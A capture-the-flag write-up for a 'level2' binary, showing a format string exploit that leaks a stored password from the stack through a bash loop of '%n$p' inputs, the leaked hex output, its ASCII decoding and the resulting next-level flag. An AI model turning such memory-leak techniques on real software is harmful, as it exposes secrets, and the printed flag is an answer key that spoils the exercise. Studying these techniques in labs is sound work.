<h1 align="center"> LEVEL 2 </h1>

## 🔍 Analysis of Decompiled [level2](./pseudo.c)

This level exploits a Format String Vulnerability in a password authentication system. The program reads a password from a file and compares it with user input.

## The Vulnerability

When authentication fails, the program prints the username. If the username contains format string specifiers, it can be used to read stack memory!

### What is a Format String Vulnerability?

```c
printf(user_input);  // VULNERABLE!
printf("%s %d %p");  // Format specifiers without arguments
```

When printf receives format specifiers, it reads from the **stack** to find the values!

### Format String Specifiers

| Specifier | Purpose |
|-----------|---------|
| `%p` | Print pointer/hex value from stack |
| `%x` | Print hex from stack |
| `%d` | Print decimal from stack |
| `%s` | Print string (dereferenced from stack) |
| `%n$p` | Access nth stack argument directly |

format string: arguments can be accessed in random order using the “%n$” syntax, which selects the nth argument directly.

## Exploitation Steps

### Step 1: Find the Encrypted Password

Use the format string vulnerability to leak stack memory. The password is stored on the stack when the program reads it from file!

```bash
for(( i = 1; i < 42; i++)); do 
    echo "$i - %$i\$p" | ./level02 | grep does
done
```

**Output:**

```bash
1 - 0x7fffffffe500 does not have access!
2 - (nil) does not have access!
3 - (nil) does not have access!
4 - 0x2a2a2a2a2a2a2a2a does not have access!
5 - 0x2a2a2a2a2a2a2a2a does not have access!
6 - 0x7fffffffe6f8 does not have access!
7 - 0x1f7ff9a08 does not have access!
8 - (nil) does not have access!
9 - (nil) does not have access!
10 - (nil) does not have access!
11 - (nil) does not have access!
12 - (nil) does not have access!
13 - (nil) does not have access!
14 - (nil) does not have access!
15 - (nil) does not have access!
16 - (nil) does not have access!
17 - (nil) does not have access!
18 - (nil) does not have access!
19 - (nil) does not have access!
20 - 0x100000000 does not have access!
21 - (nil) does not have access!
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
27 - 0xfeff00 does not have access!
28 - 0x383225202d203832 does not have access!
29 - 0x7024 does not have access!
30 - (nil) does not have access!
31 - (nil) does not have access!
32 - (nil) does not have access!
33 - (nil) does not have access!
34 - (nil) does not have access!
35 - (nil) does not have access!
36 - (nil) does not have access!
37 - (nil) does not have access!
38 - (nil) does not have access!
39 - (nil) does not have access!
40 - 0x2900000000 does not have access!
41 - 0x602010 does not have access!
```
The leaked hex values (positions 22-26) are the **encrypted password**!
```bash
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
```
### Decode the Leaked Values [hex2ascii](./hex2ascii.c)
**Result:** 
```
0x756e505234376848 -> Hh74RPnu
0x45414a3561733951 -> Q9sa5JAE
0x377a7143574e6758 -> XgNWCqz7
0x354a35686e475873 -> sXGnh5J5
0x48336750664b394d -> M9KfPg3H
Final value: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
This the LEVEL3 flag:
```bash
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
